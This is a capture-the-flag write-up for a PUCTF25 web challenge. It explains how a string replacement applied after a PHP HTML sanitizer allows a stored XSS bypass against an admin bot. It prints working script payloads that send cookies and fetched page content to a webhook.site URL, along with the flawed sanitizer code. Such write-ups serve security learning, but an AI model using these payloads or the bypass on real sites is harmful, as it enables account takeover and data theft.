# COVID-19 Mutation History

- name: COVID-19 Mutation History
- solves: 2
- points: 500
- categories
  - web

## solution

Submit the following as the mutation entry:

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd>
<script>fetch(`http://app.puctf25:8080/mutation.php?id=1`).then(a=>a.text()).then(a=>window.location.href=`https://webhook.site/6ce05aa6-50c8-468c-8b55-fe3bcef91c01/?content=`+encodeURIComponent(a))</script>">
```

Replace `https://webhook.site/6ce05aa6-50c8-468c-8b55-fe3bcef91c01/` with your own webhook that can capture requests.

The website should give you a URL to the new mutation entry: `http://chal.polyuctf.com:41340/review.php?id=19&reviewToken=171523fa6c7e58744fcf66bcf2f46fdef4be68e1849a7610111cbe2a2df2f6ea`. Change the URL host to`app.puctf25:8080`: `http://app.puctf25:8080/review.php?id=19&reviewToken=171523fa6c7e58744fcf66bcf2f46fdef4be68e1849a7610111cbe2a2df2f6ea`. Then submit it to the admin bot on <http://chal.polyuctf.com:41340/report>.

Your webhook should capture the Flag Variant page content:

```html
<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <link rel="stylesheet" href="/static/css/main.css"> <title>Mutation Entry | COVID-19 Mutation History</title> </head> <body> <div class="navbar"> <a href="/">Home</a> <a href="/submit.php">Submit New Mutation Entry</a> <a href="/logout.php">Logout (Username: admin)</a> </div> <div class="container"> <h1>Mutation Entry</h1> <div class="mutation-entry"> <h2 class="mutation-entry-title">Flag Variant (F.1.3.3.7)</h2> <p class="mutation-entry-details">PUCTF25{mUt4T1ON_x55_15_4l5o_4NoTH3r_cOv1d19_MUt4t1oN_v4R14Nt_55b02133dcd0b67440bc04a47c5d16e2}</p> </div> </div> </body> </html>
```

It contains the flag: `PUCTF25{mUt4T1ON_x55_15_4l5o_4NoTH3r_cOv1d19_MUt4t1oN_v4R14Nt_55b02133dcd0b67440bc04a47c5d16e2}`.

## process

The mention of an admin bot in the challenge description and that you can submit limited HTML code makes it obvious you need to perform XSS on the admin bot. It is also obvious that the flag should be inside the Flag Variant page, by its name and that we cannot access it directly.

Obviously, it would be too easy if you can submit arbitrary HTML code. So let's look at how the server restricts our HTML code. In `submit.php`, our submission content is processed by `sanitizeHTML`. Its code is located in `helper/utils.php`:

```PHP
function sanitizeHTML($unsafeHtml) {
    $dom = new DOMDocument();
    $dom->loadHTML($unsafeHtml, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);

    $xpath = new DOMXPath($dom);
    // we don't want HTML comments
    $comments = $xpath->query("//comment()");
    foreach ($comments as $comment) {
        $comment->parentNode->removeChild($comment);
    }

    $elements = $dom->getElementsByTagName("*");
    for ($i = $elements->length - 1; $i >= 0; $i--) {
        $element = $elements->item($i);

        // only allow whitelisted HTML tags, as defined in 
        // constant variable `ALLOWED_HTML_TAGS`
        if (!isset(ALLOWED_HTML_TAGS[$element->nodeName])) {
            $parent = $element->parentNode;
            $parent->removeChild($element);
        }

        // we don't want any attributes in all HTML elements
        while ($element->hasAttributes()) {
            $attributeName = $element->attributes->item(0)->name;
            $element->removeAttribute($attributeName);
        }
    }

    // remove HTML element `DOCTYPE`
    return preg_replace("/<!DOCTYPE\s+HTML.*>/", "", $dom->saveHTML());
}
```

We can see that the function loads the HTML code as a DOM document, removes all HTML comments, keeps whitelisted tags, removes all tag attributes, convert the DOM document back into HTML code, and finally perform a string replacement.

Past CTF experience tells me that the last string replacement is suspicious. The pattern is as follows:

Assume we have some function `sanitize` that sanitize something _properly_ \(e.g. some widely used sanitization library\), meaning there are no known vulnerabilities to exploit it. Then, the following code is probably _not_ exploitable \(unless you find zero-day exploits\):

```pseudocode
output = sanitize(input)
```

But the following code would be much more exploitable:

```pseudocode
output = sanitize(input)
output = some_string_replacement(output)
```

Often, the `some_string_replacement` is intended to "sanitize" the `input` further to make the code _less_ exploitable. But it turns out this does the opposite: it makes the code _more_ exploitable. This is because often, the `sanitize` function assumes its output is _not_ modified further afterwards. A funny analogy would be 1 + 1 is less than 1 \(sanitizing twice is not sanitizing\).

Applying this pattern to above, `some_string_replacement(output)` would be `preg_replace("/<!DOCTYPE\s+HTML.*>/", "", $dom->saveHTML())`. So now we need to craft an exploit to exploit this line. Some trial and error yields the following code:

```HTML
<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd>
(arbitrary HTML code not containing double quotes)">
```

The above HTML code, after the first sanitization step \(i.e. before the string replacement\), comes out intact. The `(arbitrary HTML code not containing double quotes)` is treated as part of a string, so the first sanitization step keeps it intact. Then, after the second sanitization step \(i.e. the string replacement\), it becomes:

```HTML

(arbitrary HTML code not containing double quotes)">
```

Now we can insert arbitrary HTML code, which means we can use `<script>`! Now, we just need to exfiltrate the Flag Variant page.

My first attempt was simply obtaining the cookie, which should include the PHP session cookie:

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd>
<script>window.location.href=`https://webhook.site/6ce05aa6-50c8-468c-8b55-fe3bcef91c01/?`+document.cookie</script>">
```

But the cookie obtained was empty. The reason being that the PHP session cookie is `HttpOnly`. In `helper/utils.php`:

```PHP
if (session_status() === PHP_SESSION_NONE) {
    session_start(COOKIE_ATTRIBUTES);
}
```

where `COOKIE_ATTRIBUTES` is defined in `helper/constant.php` as:

```PHP
define("COOKIE_ATTRIBUTES", array(
    "cookie_httponly" => true,
    "cookie_samesite" => "Strict"
));
```

So the session cookie can only be obtained by the admin bot sending a request and we receiving the request and inspect its headers. Further, the `strict` `samesite` policy means we cannot send the cookie cross-site. So it seems like we cannot obtain the PHP session cookie directly.

However, this is easy to solve once you realize you just need to get the flag, and obtaining the cookie is only one of the possible methods. Thus instead, we ask the admin bot to fetch the Flag Variant page content and send it to the webhook directly:

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd>
<script>fetch(`http://app.puctf25:8080/mutation.php?id=1`).then(a=>a.text()).then(a=>window.location.href=`https://webhook.site/6ce05aa6-50c8-468c-8b55-fe3bcef91c01/?content=`+encodeURIComponent(a))</script>">
```

We need to use <http://app.puctf25:8080/> instead of <http://chal.polyuctf.com:41340/> because the former is the host the admin bot uses to login.

And the webhook captures the Flag Variant page content:

```html
<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <link rel="stylesheet" href="/static/css/main.css"> <title>Mutation Entry | COVID-19 Mutation History</title> </head> <body> <div class="navbar"> <a href="/">Home</a> <a href="/submit.php">Submit New Mutation Entry</a> <a href="/logout.php">Logout (Username: admin)</a> </div> <div class="container"> <h1>Mutation Entry</h1> <div class="mutation-entry"> <h2 class="mutation-entry-title">Flag Variant (F.1.3.3.7)</h2> <p class="mutation-entry-details">PUCTF25{mUt4T1ON_x55_15_4l5o_4NoTH3r_cOv1d19_MUt4t1oN_v4R14Nt_55b02133dcd0b67440bc04a47c5d16e2}</p> </div> </div> </body> </html>
```

It contains the flag: `PUCTF25{mUt4T1ON_x55_15_4l5o_4NoTH3r_cOv1d19_MUt4t1oN_v4R14Nt_55b02133dcd0b67440bc04a47c5d16e2}`.
